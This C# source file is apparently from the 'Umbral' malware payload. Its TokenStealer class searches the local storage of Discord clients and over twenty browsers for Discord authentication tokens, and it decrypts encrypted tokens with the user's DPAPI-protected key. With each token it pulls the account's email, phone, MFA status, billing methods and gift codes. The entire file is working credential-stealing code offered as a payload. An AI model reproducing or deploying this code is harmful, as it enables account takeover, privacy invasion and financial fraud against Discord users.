using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Umbral.payload.Handlers;

namespace Umbral.payload.Discord
{
    internal class TokenStealer
    {
        private static readonly string RoamingPath;

        private static readonly string LocalAppDataPath;

        private static readonly HttpClient Client;

        private static List<DiscordAccountFormat> _accounts;

        static TokenStealer()
        {
            RoamingPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            LocalAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            Client = new HttpClient();
            Client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
            Client.DefaultRequestHeaders.UserAgent.ParseAdd(
                "Opera/9.80 (Windows NT 6.1; YB/4.0.0) Presto/2.12.388 Version/12.17");


            _accounts = new List<DiscordAccountFormat>();
        }

        internal static async Task<DiscordAccountFormat[]> GetAccounts()
        {
            await Run();
            return _accounts.ToArray();
        }

        private static async Task Run()
        {
            _accounts.Clear();
            var processes = new List<Task>();

            var paths = new Dictionary<string, string>
            {
                { "Discord", Path.Combine(RoamingPath, "discord") },
                { "Discord Canary", Path.Combine(RoamingPath, "discordcanary") },
                { "Lightcord", Path.Combine(RoamingPath, "Lightcord") },
                { "Discord PTB", Path.Combine(RoamingPath, "discordptb") },
                { "Opera", Path.Combine(RoamingPath, "Opera Software", "Opera Stable") },
                { "Opera GX", Path.Combine(RoamingPath, "Opera Software", "Opera GX Stable") },
                { "Amigo", Path.Combine(LocalAppDataPath, "Amigo", "User Data") },
                { "Torch", Path.Combine(LocalAppDataPath, "Torch", "User Data") },
                { "Kometa", Path.Combine(LocalAppDataPath, "Kometa", "User Data") },
                { "Orbitum", Path.Combine(LocalAppDataPath, "Orbitum", "User Data") },
                { "CentBrowse", Path.Combine(LocalAppDataPath, "CentBrowser", "User Data") },
                { "7Sta", Path.Combine(LocalAppDataPath, "7Star", "7Star", "User Data") },
                { "Sputnik", Path.Combine(LocalAppDataPath, "Sputnik", "Sputnik", "User Data") },
                { "Vivaldi", Path.Combine(LocalAppDataPath, "Vivaldi", "User Data") },
                { "Chrome SxS", Path.Combine(LocalAppDataPath, "Google", "Chrome SxS", "User Data") },
                { "Chrome", Path.Combine(LocalAppDataPath, "Google", "Chrome", "User Data") },
                { "FireFox", Path.Combine(RoamingPath, "Mozilla", "Firefox", "Profiles") },
                { "Epic Privacy Browse", Path.Combine(LocalAppDataPath, "Epic Privacy Browser", "User Data") },
                { "Microsoft Edge", Path.Combine(LocalAppDataPath, "Microsoft", "Edge", "User Data") },
                { "Uran", Path.Combine(LocalAppDataPath, "uCozMedia", "Uran", "User Data") },
                { "Yandex", Path.Combine(LocalAppDataPath, "Yandex", "YandexBrowser", "User Data") },
                { "Brave", Path.Combine(LocalAppDataPath, "BraveSoftware", "Brave-Browser", "User Data") },
                { "Iridium", Path.Combine(LocalAppDataPath, "Iridium", "User Data") }
            };

            foreach (var item in paths)
                if (Directory.Exists(item.Value))
                    switch (item.Key)
                    {
                        case "Firefox":
                            processes.Add(FireFoxMethod(item.Value));
                            break;
                        default:
                            processes.Add(MethodA(item.Value));
                            processes.Add(MethodB(item.Value));
                            break;
                    }

            await Task.WhenAll(processes);
            RemoveDuplicates();
        }

        private static async Task MethodA(string path)
        {
            string[] allowedExtentions = { ".log", ".ldb" };
            var regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);

            var processes = new List<Task>();
            var obtainedTokens = new List<string>();

            var leveldbDirs = await Task.Run(() =>
                Directory.GetDirectories(path, "leveldb", SearchOption.AllDirectories));

            foreach (var dir in leveldbDirs)
            {
                var files = Directory.GetFiles(dir, "*", SearchOption.TopDirectoryOnly)
                    .Where(file => allowedExtentions.Contains(Path.GetExtension(file)))
                    .ToArray();

                foreach (var file in files)
                    try
                    {
                        string content;

                        using (var fs = new FileStream(file, FileMode.Open, FileAccess.Read,
                                   FileShare.ReadWrite))
                        {
                            using (var reader = new StreamReader(fs))
                            {
                                content = await reader.ReadToEndAsync();
                            }
                        }

                        if (!string.IsNullOrWhiteSpace(content))
                        {
                            var matches = regex.Matches(content);

                            foreach (Match match in matches)
                            {
                                var token = match.Value;

                                if (!obtainedTokens.Contains(token))
                                {
                                    processes.Add(AddAccount(token));
                                    obtainedTokens.Add(token);
                                }
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
            }

            await Task.WhenAll(processes);
        }

        private static async Task MethodB(string path)
        {
            string[] allowedExtentions = { ".log", ".ldb" };
            var regex = new Regex(@"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*", RegexOptions.Compiled);

            var processes = new List<Task>();
            var obtainedTokens = new List<string>();

            var localStatePath = Path.Combine(path, "Local State");
            var levelDbPath = Path.Combine(path, "Local Storage", "leveldb");

            if (File.Exists(localStatePath) && Directory.Exists(levelDbPath))
                try
                {
                    string content;

                    using (var fs = new FileStream(localStatePath, FileMode.Open, FileAccess.Read,
                               FileShare.ReadWrite))
                    {
                        using (var reader = new StreamReader(fs))
                        {
                            content = await reader.ReadToEndAsync();
                        }
                    }

                    dynamic jsonContent = SimpleJson.DeserializeObject(content);

                    byte[] key = Convert.FromBase64String((string)jsonContent["os_crypt"]["encrypted_key"]).Skip(5).ToArray();

                    string[] files = await Task.Run(() => Directory.GetFiles(levelDbPath, "*", SearchOption.TopDirectoryOnly)
                        .Where(file => allowedExtentions.Contains(Path.GetExtension(file)))
                        .ToArray()
                    );

                    foreach (string file in files)
                    {
                        using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read,
                                   FileShare.ReadWrite))
                        {
                            using (StreamReader reader = new StreamReader(fs))
                            {
                                content = await reader.ReadToEndAsync();
                            }
                        }

                        if (!string.IsNullOrWhiteSpace(content))
                        {
                            var matches = regex.Matches(content);
                            foreach (Match match in matches)
                            {
                                var token = match.Value;
                                if (token.EndsWith("\\")) token = token.Take(token.Length - 1).ToString();

                                var buffer = Convert.FromBase64String(token.Split(new[] { "dQw4w9WgXcQ:" },
                                    StringSplitOptions.None)[1]);

                                token = DecryptTokenMethodB(buffer, key);

                                if (!obtainedTokens.Contains(token) && !string.IsNullOrWhiteSpace(token))
                                {
                                    processes.Add(AddAccount(token));
                                    obtainedTokens.Add(token);
                                }
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }

            await Task.WhenAll(processes);
        }

        private static async Task FireFoxMethod(string path)
        {
            var processes = new List<Task>();
            var obtainedTokens = new List<string>();
            var regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", RegexOptions.Compiled);

            var files = await Task.Run(() => Directory.GetFiles(path, "*.sqlite", SearchOption.AllDirectories));

            foreach (var file in files)
                try
                {
                    string content;

                    using (var fs = new FileStream(file, FileMode.Open, FileAccess.Read,
                               FileShare.ReadWrite))
                    {
                        using (var reader = new StreamReader(fs))
                        {
                            content = await reader.ReadToEndAsync();
                        }
                    }

                    if (!string.IsNullOrWhiteSpace(content))
                    {
                        var matches = regex.Matches(content);

                        foreach (Match match in matches)
                        {
                            var token = match.Value;
                            if (!obtainedTokens.Contains(token) && !string.IsNullOrWhiteSpace(token))
                            {
                                processes.Add(AddAccount(token));
                                obtainedTokens.Add(token);
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }

            await Task.WhenAll(processes);
        }

        private static string DecryptTokenMethodB(byte[] buffer, byte[] protectedKey)
        {
            try
            {
                byte[] cipherText = buffer.Skip(15).ToArray();
                byte[] key = ProtectedData.Unprotect(protectedKey, null, DataProtectionScope.CurrentUser);
                byte[] iv = buffer.Skip(3).Take(12).ToArray();

                byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
                
                cipherText = cipherText.Take(cipherText.Length - tag.Length).ToArray();

                byte[] token = new AesGcm().Decrypt(key, iv, null, cipherText, tag);
                return Encoding.UTF8.GetString(token);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);

                return string.Empty;
            }
        }

        private static async Task<string[]> GetBilling(string token)
        {
            var billingMethods = new List<string>();

            using (var request = new HttpRequestMessage(HttpMethod.Get,
                       "https://discordapp.com/api/v9/users/@me/billing/payment-sources"))
            {
                request.Headers.Authorization = AuthenticationHeaderValue.Parse(token);

                try
                {
                    var response = await Client.SendAsync(request);

                    if (response.IsSuccessStatusCode)
                    {
                        var content = await response.Content.ReadAsStringAsync();

                        var billingResponseJson =
                            SimpleJson.DeserializeObject<List<dynamic>>(content);

                        foreach (dynamic obj in billingResponseJson)
                        {

                            BillingResponseJsonFormat block = new BillingResponseJsonFormat
                            {
                                type = (int)obj["type"]
                            };

                            if (!new Dictionary<int, string>
                                {
                                    { 0, "(Unknown)" },
                                    { 1, "Card" }
                                }.TryGetValue(block.type, out var billingType))
                                billingType = "Paypal";

                            billingMethods.Add(billingType);
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }

            return billingMethods.ToArray();
        }

        private static async Task<GiftFormat[]> GetGifts(string token)
        {
            var gifts = new List<GiftFormat>();

            using (var request = new HttpRequestMessage(HttpMethod.Get,
                       "https://discord.com/api/v10/users/@me/outbound-promotions/codes"))
            {
                request.Headers.Authorization = AuthenticationHeaderValue.Parse(token);

                try
                {
                    var response = await Client.SendAsync(request);

                    var content = await response.Content.ReadAsStringAsync();

                    if (content.Contains("code"))
                    {
                        dynamic giftResponseJson =
                            SimpleJson.DeserializeObject<List<dynamic>>(content);

                        foreach (dynamic obj in giftResponseJson)
                        {
                            var gift = new GiftResponseJsonFormat
                            {
                                code = (string)obj["code"],
                                promotion = new Promotion
                                {
                                    outbound_title = (string)obj["promotion"]["outbound_title"]
                                }
                            };

                            var code = gift.code;
                            var title = gift.promotion.outbound_title;

                            if (!string.IsNullOrWhiteSpace(code) &&
                                !string.IsNullOrWhiteSpace(title))
                                gifts.Add(new GiftFormat(title, code));
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }

            return gifts.ToArray();
        }

        private static async Task AddAccount(string token)
        {
            using (var request =
                   new HttpRequestMessage(HttpMethod.Get, "https://discord.com/api/v10/users/@me"))
            {
                request.Headers.Authorization = AuthenticationHeaderValue.Parse(token);

                try
                {
                    var response = await Client.SendAsync(request);

                    if (response.IsSuccessStatusCode)
                    {
                        var content = await response.Content.ReadAsStringAsync();

                        dynamic jsonContent = SimpleJson.DeserializeObject(content);

                        
                        var tokenResponseJson = new TokenResponseJsonFormat
                        {
                            premium_type = (int)jsonContent["premium_type"],
                            username = (string)jsonContent["username"],
                            discriminator = (string)jsonContent["discriminator"],
                            id = (string)jsonContent["id"],
                            mfa_enabled = (bool)jsonContent["mfa_enabled"],
                            email = (string)jsonContent["email"],
                            phone = (string)jsonContent["phone"],
                            verified = (bool)jsonContent["verified"]
                        };

                        if (!new Dictionary<int, string>
                            {
                                { 0, "No Nitro" },
                                { 1, "Nitro Classic" },
                                { 2, "Nitro" },
                                { 3, "Nitro Basic" }
                            }.TryGetValue(tokenResponseJson.premium_type, out var nitroType)
                           )
                            nitroType = "(Unknown)";

                        var billing = await GetBilling(token);
                        var gifts = await GetGifts(token);

                        _accounts.Add(new DiscordAccountFormat(
                            $"{tokenResponseJson.username}#{tokenResponseJson.discriminator}", tokenResponseJson.id,
                            tokenResponseJson.mfa_enabled, tokenResponseJson.email, tokenResponseJson.phone,
                            tokenResponseJson.verified, nitroType, billing, token, gifts));
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
        }

        private static void RemoveDuplicates()
        {
            _accounts = _accounts
                .GroupBy(t => t.Token)
                .Select(t => t.First())
                .ToList();
        }
    }
}